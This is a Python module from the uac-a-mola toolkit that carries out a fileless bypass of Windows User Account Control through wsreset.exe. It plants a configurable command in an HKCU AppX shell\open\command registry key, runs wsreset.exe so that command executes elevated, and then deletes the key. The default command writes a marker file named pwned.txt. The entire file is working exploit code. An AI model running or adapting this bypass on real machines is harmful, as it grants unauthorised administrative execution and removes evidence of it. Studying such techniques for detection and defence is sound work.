#--encoding: utf-8--

# This file is part of uac-a-mola
# Author: Josue Encinar
#
# DESCRIPTION
# Fileless - Wsreset bypass UAC 


from module import Module
from support.winreg import Registry
from _winreg import HKEY_CURRENT_USER as HKCU

class CustomModule(Module):
    def __init__(self):
        information = {"Name": "Fileless Wsreset",
                       "Description": "Fileless - Wsreset bypass UAC ",
                       "Author": "Josue Encinar"}

        # -----------name-----default_value--description
        options = {"instruction": ["C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -C echo mola > c:\pwned.txt", "Elevated Code", True]
                   }

        # Constructor of the parent class
        super(CustomModule, self).__init__(information, options)

        # Class atributes, initialization in the run_module method
        # after the user has set the values
        self.reg = Registry()

    # This module must be always implemented, it is called by the run option
    def run_module(self):
        path = "Software\\Classes\\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\\Shell\\open\\command"
        print("Creating hive...")
        k = self.reg.create_key(HKCU, path)
        print("Created hive")
        print("Setting 'Default'...")
        self.reg.set_value(HKCU, path, self.args["instruction"])
        print("Done!")
        print("Executing... wsreset.exe")
        self.run_binary("C:\\Windows\\System32\\wsreset.exe")
        print("Got it? :D")
        print("Now... Deleting hive!")
        self.reg.restore(k)
        print("Deleted!")